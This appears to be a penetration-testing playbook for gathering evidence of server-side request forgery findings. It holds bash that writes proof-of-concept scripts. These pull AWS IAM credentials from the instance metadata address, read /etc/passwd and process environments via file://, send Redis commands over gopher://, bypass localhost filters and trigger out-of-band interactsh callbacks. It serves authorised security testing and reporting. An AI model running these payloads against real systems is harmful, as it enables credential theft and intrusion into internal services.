# SSRF — Evidence Collection

## Purpose
Capture reproducible proof for every SSRF finding. OOB callbacks, metadata response dumps, protocol smuggling output, service banner grabs, screenshots, and full PoC scripts that demonstrate remote request forgery.

## Required Variables
- `$TARGET_URL` — vulnerable endpoint
- `$VULN_PARAM` — SSRF parameter
- `$EVIDENCE_ROOT` — evidence base (`evidence/$TARGET/ssrf/`)

## Commands

### Standard Evidence Template

```bash
export PATH="/opt/homebrew/bin:$HOME/go/bin:$HOME/Library/Python/3.14/bin:$PATH"

FINDING_ID="ssrf_${VULN_PARAM}_$(date +%s)"
EVIDENCE_DIR="$EVIDENCE_ROOT/$FINDING_ID"
mkdir -p "$EVIDENCE_DIR"

date -u +%Y-%m-%dT%H:%M:%SZ > "$EVIDENCE_DIR/timestamp.txt"

{
  echo "curl $(curl --version | head -1)"
  echo "interactsh-client $(interactsh-client -version 2>&1 | head -1)"
  echo "jq $(jq --version)"
} > "$EVIDENCE_DIR/tool_versions.txt"
```

### OOB Callback Evidence (Interactsh)

```bash
sleep 10  # wait for interactsh to collect

cp "$OUTDIR/ssrf/interactsh_output.json" "$EVIDENCE_DIR/interactsh_raw.json" 2>/dev/null
jq '.[] | select(.protocol=="http" or .protocol=="dns")' "$EVIDENCE_DIR/interactsh_raw.json" > "$EVIDENCE_DIR/interactsh_filtered.json"

echo "OOB callbacks: $(jq -s 'length' "$EVIDENCE_DIR/interactsh_filtered.json" 2>/dev/null)" > "$EVIDENCE_DIR/oob_summary.txt"

cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
INTERACTSH_URL="$INTERACTSH_URL"
curl -s -o /dev/null "$TARGET_URL?${VULN_PARAM}=http://\${INTERACTSH_URL}/poc_$(date +%s)"
echo "SSRF PoC sent. Target will make HTTP request to interactsh."
echo "Monitor interactsh-client output for callback confirmation."
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

### Cloud Metadata Extraction Evidence

```bash
# AWS
if [ -f "$OUTDIR/ssrf/aws_full_creds.json" ]; then
  cp "$OUTDIR/ssrf/aws_full_creds.json" "$EVIDENCE_DIR/"
  cp "$OUTDIR/ssrf/aws_instance_identity.json" "$EVIDENCE_DIR/" 2>/dev/null

  cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== AWS IMDSv1 SSRF Exploitation ==="
curl -s '$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/' | tee aws_role.txt
echo ""
ROLE=\$(tr -d '\n' < aws_role.txt)
echo "Fetching credentials for role: \$ROLE"
curl -s "\$TARGET_URL?${VULN_PARAM}=http://169.254.169.254/latest/meta-data/iam/security-credentials/\${ROLE}"
POCEOF
  chmod +x "$EVIDENCE_DIR/poc.sh"
fi

# GCP
if [ -f "$OUTDIR/ssrf/gcp_token.json" ]; then
  cp "$OUTDIR/ssrf/gcp_token.json" "$EVIDENCE_DIR/" 2>/dev/null
fi

# Azure
[ -f "$OUTDIR/ssrf/azure_meta.txt" ] && cp "$OUTDIR/ssrf/azure_meta.txt" "$EVIDENCE_DIR/"
```

### Protocol Smuggling Evidence

```bash
# file://
if grep -q 'root:x:' "$OUTDIR/ssrf/file_etc_passwd.txt" 2>/dev/null; then
  cp "$OUTDIR/ssrf/file_etc_passwd.txt" "$EVIDENCE_DIR/"
  cp "$OUTDIR/ssrf/file_proc_environ.txt" "$EVIDENCE_DIR/" 2>/dev/null

  cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== SSRF file:// Protocol — /etc/passwd ==="
curl -s '$TARGET_URL?${VULN_PARAM}=file:///etc/passwd'
echo ""
echo "=== SSRF file:// Protocol — /proc/self/environ ==="
curl -s '$TARGET_URL?${VULN_PARAM}=file:///proc/self/environ'
POCEOF
  chmod +x "$EVIDENCE_DIR/poc.sh"
fi

# gopher://
if [ -s "$OUTDIR/ssrf/gopher_redis_info.txt" ] 2>/dev/null; then
  cp "$OUTDIR/ssrf/gopher_redis_info.txt" "$EVIDENCE_DIR/redis_info.txt"

  cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== SSRF gopher:// Redis INFO ==="
curl -s '$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_INFO%0D%0AQUIT%0D%0A'
echo ""
echo "=== SSRF gopher:// Redis CONFIG ==="
curl -s '$TARGET_URL?${VULN_PARAM}=gopher://127.0.0.1:6379/_CONFIG%20GET%20dir%0D%0AQUIT%0D%0A'
POCEOF
  chmod +x "$EVIDENCE_DIR/poc.sh"
fi

# dict://
[ -s "$OUTDIR/ssrf/dict_redis_info.txt" ] && cp "$OUTDIR/ssrf/dict_redis_info.txt" "$EVIDENCE_DIR/"
```

### Internal Service Evidence

```bash
[ -s "$OUTDIR/ssrf/elas_verify.txt" ] && cp "$OUTDIR/ssrf/elas_verify.txt" "$EVIDENCE_DIR/es_response.txt"
[ -s "$OUTDIR/ssrf/memcached_cachedump.txt" ] && cp "$OUTDIR/ssrf/memcached_cachedump.txt" "$EVIDENCE_DIR/"
[ -s "$OUTDIR/ssrf/docker_containers.txt" ] && cp "$OUTDIR/ssrf/docker_containers.txt" "$EVIDENCE_DIR/"
[ -s "$OUTDIR/ssrf/k8s_secrets.txt" ] && cp "$OUTDIR/ssrf/k8s_secrets.txt" "$EVIDENCE_DIR/"

# Port scan evidence
if [ -f "$OUTDIR/ssrf/subnet_live_hosts.txt" ] && [ -s "$OUTDIR/ssrf/subnet_live_hosts.txt" ]; then
  cp "$OUTDIR/ssrf/subnet_live_hosts.txt" "$EVIDENCE_DIR/"
  echo "Internal live hosts: $(wc -l < "$OUTDIR/ssrf/subnet_live_hosts.txt")" > "$EVIDENCE_DIR/internal_summary.txt"
fi
```

### DNS Rebinding / Bypass Evidence

```bash
if [ -f "$OUTDIR/ssrf/bypass_nipio.txt" ]; then
  cp "$OUTDIR/ssrf"/bypass_*.txt "$EVIDENCE_DIR/" 2>/dev/null

  cat > "$EVIDENCE_DIR/poc.sh" << POCEOF
#!/bin/bash
echo "=== SSRF IP Representation Bypass ==="
echo "Decimal:"
curl -s '$TARGET_URL?${VULN_PARAM}=http://2130706433/'
echo ""
echo "Hex:"
curl -s '$TARGET_URL?${VULN_PARAM}=http://0x7f000001/'
echo ""
echo "Wildcard DNS:"
curl -s '$TARGET_URL?${VULN_PARAM}=http://127.0.0.1.nip.io/'
POCEOF
  chmod +x "$EVIDENCE_DIR/poc.sh"
fi
```

### Evidence Manifest

```bash
{
  echo "# SSRF Evidence Manifest — $FINDING_ID"
  echo ""
  echo "## SSRF Vector"
  echo "- Target: $TARGET_URL"
  echo "- Parameter: $VULN_PARAM"
  echo "- Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
  echo ""
  echo "## Artifacts"
  echo "| File | Type | Status |"
  echo "|------|------|--------|"
  for f in "$EVIDENCE_DIR"/*; do
    [ -f "$f" ] && echo "| $(basename $f) | evidence | $( [ -s "$f" ] && echo present || echo EMPTY ) |"
  done
} > "$EVIDENCE_DIR/manifest.md"

echo "[COMPLETE] Evidence at: $EVIDENCE_DIR"
ls -lh "$EVIDENCE_DIR/"
```

## Detection Signals
- `interactsh_filtered.json` has `.protocol` entries → OOB confirmation
- `aws_full_creds.json` contains `AccessKeyId` → cloud credential evidence
- `file_etc_passwd.txt` contains `root:x:` → file read evidence
- `redis_info.txt` contains `redis_version` → Redis accessed via SSRF
- `es_response.txt` contains `cluster_name` → ElasticSearch accessed

## Next
├── All evidence verified → bundle for reporting skill
├── If cloud credentials captured → redact secret key from report body; note in confidential appendix
├── If internal services mapped → include network diagram or list of accessible hosts
└── Always → `for f in "$EVIDENCE_DIR"/*; do [ -s "$f" ] || echo "EMPTY: $f"; done`